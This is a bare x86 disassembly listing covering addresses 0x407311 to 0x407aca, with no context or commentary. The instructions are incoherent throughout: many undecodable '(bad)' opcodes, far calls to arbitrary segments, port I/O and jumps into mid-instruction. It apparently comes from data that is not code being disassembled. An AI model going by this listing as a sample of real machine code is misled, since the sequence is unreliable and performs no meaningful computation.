  407311:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407312:	cmp    ah,al
  407314:	inc    edx
  407315:	sbb    eax,0xf634b6f1
  40731a:	out    0x89,eax
  40731c:	fldenv [edi+0x31d3d6a2]
  407322:	imul   ecx,DWORD PTR [esi],0xffffffd5
  407325:	inc    esp
  407326:	js     0x40738b
  407328:	pop    ecx
  407329:	inc    ebp
  40732a:	pop    edx
  40732b:	lock aad 0x86
  40732e:	fwait
  40732f:	(bad)  
  407330:	xor    al,0xa0
  407332:	stos   DWORD PTR es:[edi],eax
  407333:	pop    ebx
  407334:	mov    ch,0x12
  407336:	imul   ebx,ecx,0xffffffe1
  407339:	jne    0x407351
  40733b:	mov    edx,0x500d0c78
  407340:	pop    edx
  407341:	xchg   ebx,eax
  407342:	imul   esi,DWORD PTR [ebx+0x3fec0839],0xffffffd8
  407349:	nop
  40734a:	jo     0x4072fa
  40734c:	cmp    bh,al
  40734e:	aaa    
  40734f:	nop
  407350:	mov    eax,0x97270601
  407355:	push   0xffffffa4
  407357:	popa   
  407358:	pop    ss
  407359:	sbb    eax,0xd183b97d
  40735e:	or     BYTE PTR [eax+0x569fcc9b],ah
  407364:	xor    al,0x26
  407366:	or     dl,ch
  407368:	xchg   esi,eax
  407369:	lods   al,BYTE PTR ds:[esi]
  40736a:	sub    BYTE PTR [esi],0x72
  40736d:	iret   
  40736e:	test   al,0xa
  407370:	push   esp
  407371:	scas   al,BYTE PTR es:[edi]
  407372:	lahf   
  407373:	dec    ebx
  407374:	retf   0xc606
  407377:	dec    esp
  407378:	pushf  
  407379:	mov    bl,0x9f
  40737b:	aam    0x9
  40737d:	and    ecx,DWORD PTR [ecx]
  40737f:	xchg   esp,eax
  407380:	pop    eax
  407381:	cmovo  edx,DWORD PTR [edi+0x46653aa1]
  407388:	loope  0x407402
  40738a:	adc    ch,cl
  40738c:	fwait
  40738d:	popf   
  40738e:	pop    ss
  40738f:	outs   dx,DWORD PTR ds:[esi]
  407390:	mov    cs,WORD PTR [edx]
  407392:	mov    esp,0x4b027103
  407397:	add    DWORD PTR [ecx+eiz*2-0x1],ebp
  40739b:	inc    eax
  40739c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40739d:	sbb    al,0xa0
  40739f:	repnz inc edi
  4073a1:	fmul   DWORD PTR [ebx+0x34f0b161]
  4073a7:	push   edx
  4073a8:	add    bh,ch
  4073aa:	xchg   BYTE PTR [ebp+0x73],dl
  4073ad:	xor    ebp,ebp
  4073af:	dec    esp
  4073b0:	push   ebp
  4073b1:	pushf  
  4073b2:	jne    0x407398
  4073b4:	sbb    BYTE PTR [esi-0x80],al
  4073b7:	(bad)  
  4073b8:	sbb    al,BYTE PTR [eax-0x10d34c4a]
  4073be:	mov    ds:0x6ac9695d,al
  4073c3:	sbb    al,0xc2
  4073c5:	enter  0xe814,0x8f
  4073c9:	xchg   cl,ch
  4073cb:	pop    ds
  4073cc:	push   es
  4073cd:	outs   dx,DWORD PTR ds:[esi]
  4073ce:	and    esi,DWORD PTR [ebp+0x2a]
  4073d1:	test   al,0x88
  4073d3:	js     0x4073ca
  4073d5:	xor    dl,bl
  4073d7:	mov    ebx,0xfe3bb563
  4073dc:	cmp    edx,DWORD PTR [ebx-0x5eb82aea]
  4073e2:	je     0x40743d
  4073e4:	ror    BYTE PTR [edi+0x51],cl
  4073e7:	call   0xc0740f03
  4073ec:	dec    edx
  4073ed:	pushf  
  4073ee:	call   FWORD PTR [ecx-0x4a]
  4073f1:	xor    DWORD PTR [ecx+0x5836768],edx
  4073f7:	xchg   bh,al
  4073f9:	sbb    DWORD PTR [ecx-0x21],ebx
  4073fc:	lahf   
  4073fd:	test   eax,0xd9564c90
  407402:	lahf   
  407403:	adc    DWORD PTR [edx+0x176e424f],esi
  407409:	adc    esi,ebx
  40740b:	call   0x1607:0x6d3abbf7
  407412:	inc    ecx
  407413:	push   ds
  407414:	sbb    eax,0x7cc37436
  407419:	mov    eax,0xdb532826
  40741e:	popf   
  40741f:	daa    
  407420:	enter  0xa7e2,0x92
  407424:	daa    
  407425:	mov    ah,0x7
  407427:	bound  esi,QWORD PTR [eax+0x11]
  40742a:	pop    DWORD PTR [ebp+0x1b5c9e59]
  407430:	out    dx,eax
  407431:	cmp    eax,DWORD PTR [ebp-0x39]
  407434:	int3   
  407435:	xchg   esi,eax
  407436:	mov    cl,0x65
  407438:	lds    esi,FWORD PTR [ebx+edx*8]
  40743b:	bound  eax,QWORD PTR [esi]
  40743d:	jb     0x407454
  40743f:	mov    BYTE PTR [eax+0xf],0x84
  407443:	mov    esi,0x884a2719
  407448:	(bad)  
  407449:	sub    BYTE PTR [esi+0x4238bc44],bh
  40744f:	mov    ch,0x4f
  407451:	and    eax,0x967a041
  407456:	popa   
  407457:	scas   al,BYTE PTR es:[edi]
  407458:	sti    
  407459:	jns    0x40743d
  40745b:	es sub eax,0x16e52e94
  407461:	jmp    0x3fdf2c35
  407466:	jg     0x40745b
  407468:	and    eax,0x5223905a
  40746d:	push   cs
  40746e:	fcom   DWORD PTR [edi+esi*1]
  407471:	mov    al,ds:0xc2a3c425
  407476:	lock pop ds
  407478:	jns    0x407442
  40747a:	test   eax,0x5b659345
  40747f:	pop    esp
  407480:	mov    bl,0x1
  407482:	jae    0x4074a7
  407484:	sbb    al,0xff
  407486:	aas    
  407487:	adc    bl,BYTE PTR [ebp+esi*8-0x78d7eaf1]
  40748e:	clc    
  40748f:	int    0x6e
  407491:	lea    ecx,[esi]
  407493:	lds    ebp,FWORD PTR [ecx+0x21765582]
  407499:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40749a:	add    eax,0x8a18d732
  40749f:	into   
  4074a0:	or     cl,BYTE PTR ss:[ebp-0x74]
  4074a4:	cmp    eax,0x2a315617
  4074a9:	arpl   dx,bx
  4074ab:	sbb    esi,DWORD PTR [eax+0x4c]
  4074ae:	sub    al,0x6b
  4074b0:	push   ss
  4074b1:	or     al,BYTE PTR [edi]
  4074b3:	pop    es
  4074b4:	shl    eax,1
  4074b6:	jle    0x4074c3
  4074b8:	lods   eax,DWORD PTR ds:[esi]
  4074b9:	loopne 0x407487
  4074bb:	dec    esi
  4074bc:	jmp    0xe00bf64b
  4074c1:	pop    ebx
  4074c2:	and    eax,0xcf7ad9a7
  4074c7:	dec    esi
  4074c8:	xor    BYTE PTR [bp+di],cl
  4074cb:	sub    esp,DWORD PTR [edx+0x50]
  4074ce:	and    DWORD PTR [ebp-0xdf945fd],edi
  4074d4:	fst    st(2)
  4074d6:	stos   DWORD PTR es:[edi],eax
  4074d7:	mov    ah,0x7f
  4074d9:	jmp    0x34ec:0x8e79b1ea
  4074e0:	dec    esp
  4074e1:	inc    esp
  4074e2:	outs   dx,DWORD PTR ds:[esi]
  4074e3:	push   ebp
  4074e4:	mov    esp,0xf51b1216
  4074e9:	push   ds
  4074ea:	xlat   BYTE PTR ds:[ebx]
  4074eb:	jge    0x4074c8
  4074ed:	mov    edx,ebp
  4074ef:	and    esi,DWORD PTR ds:0x2773f578
  4074f5:	arpl   WORD PTR [ebp+ebx*2-0x796099eb],si
  4074fc:	mov    cl,0xa6
  4074fe:	cmp    BYTE PTR [esi-0x7fbc5cfa],0x4b
  407505:	out    dx,al
  407506:	stos   DWORD PTR es:[edi],eax
  407507:	stc    
  407508:	mov    bh,0x49
  40750a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40750b:	in     eax,0xa7
  40750d:	jmp    0x9279:0x2b3285a6
  407514:	imul   edx,DWORD PTR [edi+0x2bb14c57],0x71
  40751b:	je     0x40752e
  40751d:	or     dh,BYTE PTR ds:0xb811a2e8
  407523:	and    eax,esp
  407525:	mov    esi,0x8ada9c14
  40752a:	sar    BYTE PTR [edx-0x42161a4],1
  407530:	cmp    ah,BYTE PTR [ebx+0x42]
  407533:	jecxz  0x4075a3
  407535:	imul   esi,DWORD PTR [edx+0x640d05e3],0x5c
  40753c:	adc    cl,ah
  40753e:	dec    ecx
  40753f:	adc    esp,DWORD PTR [esi-0x88b9320]
  407545:	dec    edi
  407546:	push   ebx
  407547:	dec    esi
  407548:	xchg   esp,eax
  407549:	mov    dh,0xca
  40754b:	mov    edx,0x6d545b23
  407550:	es call 0x2e039306
  407556:	jnp    0x407548
  407558:	dec    edx
  407559:	inc    ecx
  40755a:	xor    al,0x56
  40755c:	gs ror dl,1
  40755f:	dec    ebx
  407560:	push   ecx
  407561:	push   esi
  407562:	pop    eax
  407563:	xor    eax,0x34ecf5b1
  407568:	and    DWORD PTR [esi+0x3d88190b],esi
  40756e:	or     al,0xda
  407570:	pop    edx
  407571:	sub    edi,edx
  407573:	ja     0x4075e4
  407575:	(bad)  
  407576:	xchg   edi,eax
  407577:	push   edi
  407578:	loopne 0x40750f
  40757a:	stos   BYTE PTR es:[edi],al
  40757b:	push   esp
  40757c:	dec    esp
  40757d:	sbb    ebx,DWORD PTR [edx]
  40757f:	fs jo  0x40752a
  407582:	cmp    al,0xf5
  407584:	addr16 add eax,0xd0430f9d
  40758a:	cmp    ebx,DWORD PTR [edi+eax*4-0x55f1d443]
  407591:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407592:	loope  0x407574
  407594:	das    
  407595:	jbe    0x407569
  407597:	std    
  407598:	stos   DWORD PTR es:[edi],eax
  407599:	lods   eax,DWORD PTR ds:[esi]
  40759a:	push   cs
  40759b:	dec    ecx
  40759c:	and    BYTE PTR [eax],0xb6
  40759f:	call   0x310c:0x346dacc
  4075a6:	mov    cl,0x3f
  4075a8:	out    dx,al
  4075a9:	dec    eax
  4075aa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4075ab:	xor    bh,BYTE PTR [edx+0x170668d8]
  4075b1:	stos   BYTE PTR es:[edi],al
  4075b2:	inc    esp
  4075b3:	pop    ebp
  4075b4:	mov    edi,0x44a8bd30
  4075b9:	or     eax,0x42f8f923
  4075be:	pop    ebx
  4075bf:	in     eax,0x12
  4075c1:	inc    esp
  4075c2:	adc    al,0x57
  4075c4:	aad    0x25
  4075c6:	dec    ecx
  4075c7:	into   
  4075c8:	push   ebx
  4075c9:	adc    esp,DWORD PTR [ebx]
  4075cb:	into   
  4075cc:	loopne 0x4075a3
  4075ce:	or     edx,eax
  4075d0:	mov    ebp,0xc77bfea3
  4075d5:	pushf  
  4075d6:	mov    ah,0x91
  4075d8:	jp     0x407600
  4075da:	outs   dx,BYTE PTR ds:[esi]
  4075db:	enter  0x775e,0x44
  4075df:	in     al,dx
  4075e0:	pop    ebp
  4075e1:	out    0x6d,al
  4075e3:	dec    edx
  4075e4:	mov    al,ds:0x7c6509e7
  4075e9:	mov    eax,ds:0xdd03a500
  4075ee:	vfmsubpd xmm6,xmm7,xmm5,XMMWORD PTR [edi+0x1]
  4075f5:	inc    esi
  4075f6:	pop    ebp
  4075f7:	in     eax,0x1
  4075f9:	jns    0x407602
  4075fb:	xlat   BYTE PTR ds:[ebx]
  4075fc:	(bad)  
  4075fd:	daa    
  4075fe:	mov    esp,0xbb4cd932
  407603:	pop    eax
  407604:	dec    edi
  407605:	nop
  407606:	inc    ebx
  407607:	inc    esi
  407608:	test   bl,bh
  40760a:	adc    esp,DWORD PTR [edx+0x4f18291d]
  407610:	jbe    0x40767a
  407612:	std    
  407613:	xchg   ebp,eax
  407614:	inc    ebp
  407615:	mov    ah,0xcd
  407617:	mov    bl,0xf6
  407619:	cmc    
  40761a:	mov    dh,0xc3
  40761c:	cdq    
  40761d:	scas   eax,DWORD PTR es:[edi]
  40761e:	rol    DWORD PTR [esi+0x25f9b324],1
  407624:	test   cl,bl
  407626:	dec    ebp
  407627:	sub    ebx,DWORD PTR [esi-0x1b]
  40762a:	jo     0x4075c2
  40762c:	cdq    
  40762d:	bound  esp,QWORD PTR [ebp+0x48946909]
  407633:	mov    edi,0x62b27c07
  407638:	and    eax,0x31f0ac47
  40763d:	xchg   ebp,eax
  40763e:	inc    edx
  40763f:	stc    
  407640:	pusha  
  407641:	pop    eax
  407642:	adc    ch,dh
  407644:	(bad)  
  407646:	adc    al,BYTE PTR [ebp-0x3c]
  407649:	push   es
  40764a:	xchg   ebp,eax
  40764b:	mov    ah,0xa9
  40764d:	icebp  
  40764e:	jl     0x40766f
  407650:	and    edx,DWORD PTR [ebp-0x1e]
  407653:	in     al,0xb4
  407655:	mov    ecx,ds
  407657:	iret   
  407658:	push   ecx
  407659:	in     eax,dx
  40765a:	jne    0x4076ab
  40765c:	inc    esp
  40765d:	das    
  40765e:	sub    DWORD PTR [eax-0x55],edx
  407661:	imul   ecx,DWORD PTR [ebx-0x6c],0xffffff90
  407665:	scas   al,BYTE PTR es:[edi]
  407666:	cmp    esi,DWORD PTR ds:0x69178895
  40766c:	les    ebx,FWORD PTR [eax+0x67b050dd]
  407672:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407673:	cmp    esi,DWORD PTR [ebx]
  407675:	das    
  407676:	or     al,0x91
  407678:	scas   al,BYTE PTR es:[edi]
  407679:	into   
  40767a:	mov    ds:0xf474e3d2,eax
  40767f:	call   0x1ad1:0x9eea7836
  407686:	loop   0x40764f
  407688:	or     al,0xdf
  40768a:	ficom  WORD PTR [edx+0x4a]
  40768d:	cmp    al,0x6c
  40768f:	mov    ebp,0xee6afef8
  407694:	pusha  
  407695:	push   esp
  407696:	jne    0x407671
  407698:	sub    eax,0xf42e7e58
  40769d:	mov    eax,0xf3f04eae
  4076a2:	jg     0x4076b7
  4076a4:	dec    esp
  4076a5:	adc    edi,DWORD PTR [esi+0x18]
  4076a8:	sub    al,0x57
  4076aa:	fstp   TBYTE PTR [ebx+0x2c200955]
  4076b0:	imul   edx,DWORD PTR [edi],0x58cc7a14
  4076b6:	out    dx,al
  4076b7:	cmp    esp,DWORD PTR [edi+0x1b]
  4076ba:	addr16 (bad) 
  4076bd:	jp     0x4076e9
  4076bf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4076c0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4076c1:	call   0x397f:0x3f46f1c8
  4076c8:	popf   
  4076c9:	mov    ebx,0xdb4f82f5
  4076ce:	xor    eax,0x45b352e1
  4076d3:	add    BYTE PTR [ebp-0x73fcca5],0xc5
  4076da:	daa    
  4076db:	dec    BYTE PTR ds:0x996f806f
  4076e1:	and    al,0xdc
  4076e3:	pop    es
  4076e4:	out    dx,eax
  4076e5:	daa    
  4076e6:	call   0x45e2:0xd0d1126c
  4076ed:	mov    ds:0x49e0de05,al
  4076f2:	sbb    eax,0x6b6eed1a
  4076f7:	jnp    0x4076e1
  4076f9:	loopne 0x4076dc
  4076fb:	es mov dh,0x6
  4076fe:	sbb    eax,0x955aa2fc
  407703:	pusha  
  407704:	pop    ecx
  407705:	push   ds
  407706:	arpl   di,bp
  407708:	iret   
  407709:	sar    BYTE PTR [ebx+0x72],cl
  40770c:	int    0xc9
  40770e:	pop    edi
  40770f:	repz jle 0x407739
  407712:	cdq    
  407713:	jle    0x4076d4
  407715:	sbb    eax,0x627e2b75
  40771a:	and    al,0xaa
  40771c:	mov    bl,0x91
  40771e:	pop    edx
  40771f:	pop    edx
  407720:	mov    ebp,DWORD PTR [esi]
  407722:	stc    
  407723:	in     eax,0x8
  407725:	and    al,0x8d
  407727:	and    al,dl
  407729:	push   0xffffffab
  40772b:	mov    DWORD PTR [edi+0x22e4798a],esi
  407731:	dec    esi
  407732:	popf   
  407733:	inc    eax
  407734:	mov    cl,BYTE PTR [edi]
  407736:	push   ebp
  407737:	sub    al,0x1b
  407739:	mov    edx,0x656b1f5f
  40773e:	and    esi,edi
  407740:	cs das 
  407742:	jnp    0x4077a7
  407744:	push   ebx
  407745:	lahf   
  407746:	into   
  407747:	aaa    
  407748:	push   eax
  407749:	call   0x53fa:0xc9a88893
  407750:	ds xor eax,0xaa9391eb
  407756:	inc    edx
  407757:	cmp    esi,DWORD PTR [eax-0x36]
  40775a:	xchg   ebp,eax
  40775b:	jae    0x40774a
  40775d:	js     0x407724
  40775f:	lods   al,BYTE PTR ds:[esi]
  407760:	dec    eax
  407761:	(bad)  
  407762:	xor    eax,0xbb0897c4
  407767:	and    BYTE PTR [edi-0x2d],dh
  40776a:	js     0x4077c6
  40776c:	adc    al,0x47
  40776e:	shl    BYTE PTR [ebx-0x3],cl
  407771:	push   cs
  407772:	aas    
  407773:	push   ds
  407774:	out    dx,al
  407775:	jae    0x407703
  407777:	pop    ebx
  407778:	jecxz  0x4077df
  40777a:	add    eax,0xa297c0dc
  40777f:	(bad)  
  407780:	cmp    DWORD PTR [ecx-0x4117c559],esi
  407786:	nop
  407787:	dec    esp
  407788:	loope  0x4077a1
  40778a:	push   0x8
  40778c:	inc    edi
  40778d:	jmp    0x40776c
  40778f:	sub    al,0x12
  407791:	add    al,0xba
  407793:	adc    DWORD PTR [edi],0xffffffbe
  407796:	or     ebp,edi
  407798:	test   BYTE PTR [eax],ch
  40779a:	sbb    esi,ebx
  40779c:	out    0x76,eax
  40779e:	push   0xf1a342de
  4077a3:	imul   ebx,DWORD PTR [ecx+ecx*4+0x68],0xbcdd883f
  4077ab:	inc    edx
  4077ac:	popa   
  4077ad:	jl     0x4077bc
  4077af:	sahf   
  4077b0:	ins    BYTE PTR es:[edi],dx
  4077b1:	mov    esi,DWORD PTR [ebp-0x65]
  4077b4:	xchg   edi,esp
  4077b6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4077b7:	sbb    eax,0xded6c8d1
  4077bc:	jle    0x4077bb
  4077be:	mul    BYTE PTR [edi+0x49]
  4077c1:	int    0x74
  4077c3:	and    bl,dh
  4077c5:	scas   al,BYTE PTR es:[edi]
  4077c6:	xor    DWORD PTR [edi],0xffffffb0
  4077c9:	imul   dl
  4077cb:	or     al,0x8a
  4077cd:	(bad)  
  4077ce:	mov    ds:0x569085cd,al
  4077d3:	js     0x407760
  4077d5:	jp     0x40777a
  4077d7:	les    edx,FWORD PTR [ebx]
  4077d9:	pop    es
  4077da:	xor    ebx,DWORD PTR [esi+0x4afe7d65]
  4077e0:	jo     0x4077e3
  4077e2:	or     cl,ch
  4077e4:	call   FWORD PTR [edx]
  4077e6:	bnd jbe 0x4077b1
  4077e9:	inc    ecx
  4077ea:	daa    
  4077eb:	pop    ecx
  4077ec:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4077ed:	cmc    
  4077ee:	imul   esp,DWORD PTR [ecx+0x44dd1dd],0x3524d1ea
  4077f8:	stos   BYTE PTR es:[edi],al
  4077f9:	jmp    0x407820
  4077fb:	and    eax,0x4b9142f2
  407800:	add    bl,BYTE PTR [ebp-0xb01640a]
  407806:	outs   dx,DWORD PTR ds:[esi]
  407807:	sub    esp,edi
  407809:	jg     0x4077fd
  40780b:	mov    bl,BYTE PTR [edx]
  40780d:	and    esp,DWORD PTR [edi]
  40780f:	push   ss
  407810:	stc    
  407811:	cs js  0x407802
  407814:	cmp    eax,0xcc7cbb8c
  407819:	ins    BYTE PTR es:[edi],dx
  40781a:	loope  0x407838
  40781c:	aas    
  40781d:	push   edx
  40781e:	inc    ebp
  40781f:	cmc    
  407820:	daa    
  407821:	adc    BYTE PTR [ebp+0x4],ah
  407824:	add    eax,0x69b27e47
  407829:	push   edi
  40782a:	pop    ecx
  40782b:	pop    edi
  40782c:	and    DWORD PTR [edi-0x7a289aca],edx
  407832:	pushf  
  407833:	out    0x5a,eax
  407835:	jae    0x407853
  407837:	inc    ecx
  407838:	(bad)  
  407839:	(bad)  [ecx+0x14]
  40783c:	shr    ebp,cl
  40783e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40783f:	jb     0x4077d5
  407841:	sub    cl,BYTE PTR [edi-0x75a9bd93]
  407847:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407848:	xor    al,BYTE PTR [ebx+0x484a1c7a]
  40784e:	xor    al,0xaf
  407850:	sub    al,0x31
  407852:	call   0x1aced8af
  407857:	leave  
  407858:	mov    DWORD PTR [ebp+0x7e],ecx
  40785b:	imul   ecx,DWORD PTR [esi-0x71c1f834],0xffffff8b
  407862:	(bad)  
  407863:	jl     0x40789c
  407865:	ret    
  407866:	jbe    0x407850
  407868:	mov    ch,0x76
  40786a:	jbe    0x407806
  40786c:	mov    DWORD PTR [ebx-0xe6f0e6f],eax
  407872:	into   
  407873:	lods   eax,DWORD PTR ds:[esi]
  407874:	fisubr WORD PTR [eiz*1+0x662ad759]
  40787b:	fld    DWORD PTR [edx]
  40787d:	mov    al,0x52
  40787f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407880:	gs xor eax,edx
  407883:	outs   dx,DWORD PTR ds:[esi]
  407884:	out    dx,al
  407885:	xor    DWORD PTR [edx],ecx
  407887:	aaa    
  407888:	lock ds add al,0x63
  40788c:	add    edi,DWORD PTR [edi]
  40788e:	outs   dx,BYTE PTR ds:[esi]
  40788f:	inc    eax
  407890:	add    BYTE PTR ds:0x32b9ddaa,0x88
  407897:	inc    ebp
  407898:	adc    al,0x37
  40789a:	xchg   ebx,eax
  40789b:	adc    eax,edi
  40789d:	fwait
  40789e:	push   esi
  40789f:	push   es
  4078a0:	push   cs
  4078a1:	cmp    BYTE PTR [esi-0x32],ah
  4078a4:	ret    0x62de
  4078a7:	jnp    0x4078da
  4078a9:	clc    
  4078aa:	add    ebx,edx
  4078ac:	outs   dx,DWORD PTR ds:[esi]
  4078ad:	pop    ds
  4078ae:	lods   al,BYTE PTR ds:[esi]
  4078af:	cmp    DWORD PTR [ebp+esi*8-0x2a],ebp
  4078b3:	add    al,0x82
  4078b5:	pop    ss
  4078b6:	ror    BYTE PTR [ebp+0x7ab9637b],0xc8
  4078bd:	fstp   QWORD PTR [ecx+0x2d]
  4078c0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4078c1:	jae    0x4078df
  4078c3:	arpl   si,ax
  4078c5:	dec    ebp
  4078c6:	xor    edx,ecx
  4078c8:	or     al,0x22
  4078ca:	call   0xbac28af1
  4078cf:	push   eax
  4078d0:	cs loopne 0x407887
  4078d3:	jmp    0xf314934b
  4078d8:	(bad)  
  4078d9:	adc    DWORD PTR [ebx+0x7250d15a],ebp
  4078df:	in     eax,0x26
  4078e1:	xchg   edi,eax
  4078e2:	push   esi
  4078e3:	adc    eax,0x4b41f350
  4078e8:	jne    0x407884
  4078ea:	mov    ch,0xf
  4078ec:	jnp    0x4078f1
  4078ee:	aam    0x21
  4078f0:	sbb    DWORD PTR [esi-0x3b],edx
  4078f3:	dec    ebp
  4078f4:	xor    eax,0x76270f58
  4078f9:	pop    eax
  4078fa:	xchg   esp,eax
  4078fb:	mov    bl,0x7
  4078fd:	cmp    al,0xdd
  4078ff:	int3   
  407900:	cld    
  407901:	fnstenv [ebx+0x67]
  407904:	loopne 0x407904
  407906:	push   cs
  407907:	sbb    eax,0x68b5e58d
  40790c:	inc    esp
  40790d:	ja     0x407982
  40790f:	in     eax,dx
  407910:	sbb    ebx,DWORD PTR [eax+esi*1-0x1c961eb3]
  407917:	hlt    
  407918:	out    0x23,eax
  40791a:	lods   eax,DWORD PTR ds:[esi]
  40791b:	push   ss
  40791c:	push   edx
  40791d:	inc    ecx
  40791e:	outs   dx,BYTE PTR ds:[esi]
  40791f:	mov    dh,0xdb
  407921:	cs push 0x28
  407924:	lods   eax,DWORD PTR ds:[esi]
  407925:	fstp   DWORD PTR [ebx+ebx*1-0x773cce41]
  40792c:	mov    bh,0x91
  40792e:	jne    0x407959
  407930:	mov    eax,ds:0x17b49203
  407935:	lds    edi,FWORD PTR [ebx]
  407937:	or     eax,0xd16c40d8
  40793c:	sbb    al,0x72
  40793e:	push   ss
  40793f:	jmp    0xf7c493c1
  407944:	call   0x845c1e8a
  407949:	or     DWORD PTR [ecx],eax
  40794b:	es aad 0x4c
  40794e:	pop    edi
  40794f:	xchg   esi,eax
  407950:	std    
  407951:	scas   al,BYTE PTR es:[edi]
  407952:	mov    DWORD PTR [edi-0x74],ebp
  407955:	inc    eax
  407956:	aaa    
  407957:	mov    al,0xf3
  407959:	scas   eax,DWORD PTR es:[edi]
  40795a:	fist   WORD PTR [esi]
  40795c:	jb     0x407948
  40795e:	jbe    0x407944
  407960:	pop    edi
  407961:	(bad)  
  407962:	xchg   edi,eax
  407963:	sub    al,0x9b
  407965:	outs   dx,BYTE PTR ds:[esi]
  407966:	jle    0x407924
  407968:	pop    eax
  407969:	jecxz  0x407932
  40796b:	inc    esp
  40796c:	sbb    ebp,DWORD PTR [ebx+0x50]
  40796f:	jnp    0x40796c
  407971:	ret    
  407972:	popa   
  407973:	mov    dh,0x74
  407975:	push   0x2735bbfd
  40797a:	(bad)  
  40797b:	ss dec ebx
  40797d:	stc    
  40797e:	aaa    
  40797f:	cmp    DWORD PTR [ebx+0x2c3acc71],0x35e03f50
  407989:	jns    0x40798b
  40798b:	cmc    
  40798c:	(bad)  
  40798d:	enter  0xd13c,0x18
  407991:	and    DWORD PTR [edx-0x7a],esp
  407994:	and    eax,0xaed6b013
  407999:	daa    
  40799a:	push   ds
  40799b:	pmovmskb edx,mm2
  40799e:	dec    esi
  40799f:	xchg   esp,eax
  4079a0:	jge    0x4079fc
  4079a2:	test   eax,0xaf2933a0
  4079a7:	xchg   ecx,eax
  4079a8:	div    ebp
  4079aa:	enter  0xb6bb,0xd2
  4079ae:	push   eax
  4079af:	(bad)  
  4079b0:	jne    0x407944
  4079b2:	bnd jmp 0x1ee21256
  4079b8:	xor    eax,0xa93705f1
  4079bd:	mov    gs,ebx
  4079bf:	lahf   
  4079c0:	pop    ecx
  4079c1:	test   DWORD PTR [ecx],ebx
  4079c3:	scas   al,BYTE PTR es:[edi]
  4079c4:	mov    BYTE PTR [esp+ecx*2-0x2ee8eef2],0x7c
  4079cc:	daa    
  4079cd:	cmp    ecx,0xff7a45d8
  4079d3:	imul   ecx
  4079d5:	push   esp
  4079d6:	ins    DWORD PTR es:[edi],dx
  4079d7:	fld    QWORD PTR [ebx+0x4e]
  4079da:	jp     0x407a08
  4079dc:	movs   BYTE PTR es:[edi],BYTE PTR gs:[esi]
  4079de:	in     eax,0x75
  4079e0:	push   ecx
  4079e1:	pop    ecx
  4079e2:	or     DWORD PTR [eax+0x24],esp
  4079e5:	pusha  
  4079e6:	cmp    DWORD PTR [edx+0x29b57522],edi
  4079ec:	cli    
  4079ed:	jg     0x407a47
  4079ef:	(bad)  
  4079f0:	enter  0x7445,0xdf
  4079f4:	stc    
  4079f5:	cmp    cl,dl
  4079f7:	xor    eax,0xb57f5e9f
  4079fc:	jns    0x407a6d
  4079fe:	add    dh,BYTE PTR [eax-0x4650c23e]
  407a04:	loop   0x407a57
  407a06:	sbb    ah,BYTE PTR [esi+0x1a]
  407a09:	add    bh,BYTE PTR [edi+0x7b]
  407a0c:	bound  esp,QWORD PTR [edi-0x2d]
  407a0f:	xor    BYTE PTR [eax+edi*8-0x67],cl
  407a13:	pop    ss
  407a14:	xor    eax,0xa6cfd176
  407a19:	cmp    DWORD PTR [edx+0x33398d14],esp
  407a1f:	cli    
  407a20:	xchg   ecx,eax
  407a21:	inc    esi
  407a22:	sbb    al,0x69
  407a24:	and    dl,ch
  407a26:	loop   0x407a0a
  407a28:	addr16 iret 
  407a2a:	ret    
  407a2b:	stos   BYTE PTR es:[edi],al
  407a2c:	jmp    0x4079e3
  407a2e:	fwait
  407a2f:	(bad)  
  407a30:	outs   dx,BYTE PTR ds:[esi]
  407a31:	adc    eax,0x945f131d
  407a36:	adc    BYTE PTR [edx-0x549658dc],ch
  407a3c:	cmp    al,0xf0
  407a3e:	aad    0x8c
  407a40:	inc    ebp
  407a41:	inc    edx
  407a42:	aaa    
  407a43:	dec    esp
  407a44:	retf   
  407a45:	out    0x1d,eax
  407a47:	inc    esp
  407a48:	and    ebp,eax
  407a4a:	loop   0x407a34
  407a4c:	cmc    
  407a4d:	push   0x5f
  407a4f:	jae    0x407a56
  407a51:	mov    bh,0x87
  407a53:	mov    DWORD PTR [ebx+eax*2],ebp
  407a56:	sbb    eax,esi
  407a58:	adc    cl,BYTE PTR [esi-0x80]
  407a5b:	sub    eax,0x52a92f06
  407a60:	fisttp QWORD PTR [edi+0x6c04f425]
  407a66:	test   al,0xa9
  407a68:	jecxz  0x407a2e
  407a6a:	imul   eax,DWORD PTR [ecx+0x6411fe59],0xffffff91
  407a71:	outs   dx,BYTE PTR ds:[esi]
  407a72:	adc    DWORD PTR [ecx-0x45],0x38
  407a76:	ret    
  407a77:	fwait
  407a78:	(bad)  
  407a79:	js     0x407aea
  407a7b:	retf   
  407a7c:	fsubr  DWORD PTR [eax-0x68f67789]
  407a82:	mov    ebx,0xf34bba54
  407a87:	sub    esi,DWORD PTR [ecx+ebp*8+0x738884f7]
  407a8e:	sub    edx,edi
  407a90:	call   0x5dc3:0x98503222
  407a97:	(bad)  
  407a98:	dec    ebx
  407a99:	sub    BYTE PTR [edi],bl
  407a9b:	pop    es
  407a9c:	xchg   ebp,eax
  407a9d:	add    edx,DWORD PTR [edx]
  407a9f:	shl    DWORD PTR [ecx+0x26f94751],cl
  407aa5:	push   ecx
  407aa6:	dec    ecx
  407aa7:	adc    BYTE PTR [eax-0x7e1da43f],0x1e
  407aae:	push   ds
  407aaf:	icebp  
  407ab0:	mov    ecx,0xc0ba03b7
  407ab5:	nop
  407ab6:	jp     0x407aca
  407ab8:	pop    ebx
  407ab9:	mov    edi,0xe55a82eb
  407abe:	fmul   st(7),st
  407ac0:	push   cs
  407ac1:	xchg   edi,eax
  407ac2:	dec    ebx
  407ac3:	dec    edi
  407ac4:	mov    esp,0xe9421ec3
  407ac9:	clc    
  407aca:	pop    ds
